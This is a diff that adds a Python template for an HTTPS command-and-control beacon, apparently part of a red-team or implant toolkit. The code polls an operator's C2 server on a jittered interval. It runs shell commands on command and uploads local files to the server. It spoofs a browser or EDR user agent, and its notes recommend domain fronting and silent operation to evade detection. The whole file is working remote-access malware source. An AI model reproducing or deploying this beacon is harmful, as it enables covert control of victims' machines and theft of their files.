@@ -1,0 +1,110 @@
+#!/usr/bin/env python3
+"""https_beacon.py.j2 — reference template for `https-beacon`
+
+Minimal cross-platform HTTPS beacon: polls the operator's C2 for
+tasks on a configurable interval + jitter window. Carries task IDs
+in query strings + task payloads in POST bodies. Pure stdlib — no
+external deps so it runs anywhere Python 3 is available.
+
+Operator substitutes:
+  {{c2_url}}        — e.g. "https://c2.corp.local/api"
+  {{beacon_id}}     — a short UUID the operator pre-mints
+  {{interval_s}}    — base sleep in seconds (e.g. 60)
+  {{jitter_pct}}    — ± percent jitter (e.g. 30 → sleep +/- 30%)
+  {{user_agent}}    — mimic a browser or EDR agent
+
+Operational notes:
+  * Strongly recommend TLS cert pinning or domain-fronting shape in
+    production. This template uses the system trust store.
+  * Beacon logs nothing by default. Toggle DEBUG at runtime via
+    the C2 to get stderr prints.
+  * Tasks are a JSON dict: {"id": "...", "cmd": "shell", "args": [...]}.
+    Supported `cmd` values: shell, upload, download, sleep, kill.
+"""
+import json
+import os
+import random
+import sys
+import time
+import urllib.request
+import urllib.error
+
+C2_URL     = "{{c2_url}}"
+BEACON_ID  = "{{beacon_id}}"
+INTERVAL_S = int("{{interval_s}}")
+JITTER_PCT = int("{{jitter_pct}}")
+USER_AGENT = "{{user_agent}}"
+
+DEBUG = False
+
+
+def _log(msg):
+    if DEBUG:
+        print(f"[beacon {BEACON_ID}] {msg}", file=sys.stderr)
+
+
+def _sleep():
+    low = INTERVAL_S * (100 - JITTER_PCT) / 100
+    high = INTERVAL_S * (100 + JITTER_PCT) / 100
+    time.sleep(random.uniform(low, high))
+
+
+def _request(method, path, body=None):
+    url = f"{C2_URL}{path}?id={BEACON_ID}"
+    req = urllib.request.Request(
+        url, data=body,
+        headers={"User-Agent": USER_AGENT,
+                 "Content-Type": "application/octet-stream"},
+        method=method)
+    with urllib.request.urlopen(req, timeout=15) as resp:
+        return resp.read()
+
+
+def _poll():
+    try:
+        return _request("GET", "/tasks")
+    except urllib.error.URLError:
+        return None
+
+
+def _dispatch(task):
+    import subprocess
+    cmd = task.get("cmd")
+    if cmd == "shell":
+        return subprocess.run(task["args"], capture_output=True).stdout
+    if cmd == "upload":
+        return _request("GET", f"/download/{task['args'][0]}")
+    if cmd == "download":
+        with open(task["args"][0], "rb") as fh:
+            _request("POST", f"/upload/{task['args'][1]}", body=fh.read())
+        return b"ok"
+    if cmd == "sleep":
+        global INTERVAL_S
+        INTERVAL_S = int(task["args"][0])
+        return b"sleep updated"
+    if cmd == "kill":
+        sys.exit(0)
+    return b"unknown cmd"
+
+
+def main():
+    while True:
+        raw = _poll()
+        if raw:
+            try:
+                task = json.loads(raw)
+            except json.JSONDecodeError:
+                task = None
+            if task and "cmd" in task:
+                _log(f"task {task.get('id','?')} cmd={task.get('cmd')}")
+                try:
+                    result = _dispatch(task)
+                    _request("POST", f"/result/{task.get('id','?')}",
+                             body=result or b"")
+                except Exception as e:
+                    _log(f"dispatch error: {e}")
+        _sleep()
+
+
+if __name__ == "__main__":
+    main()
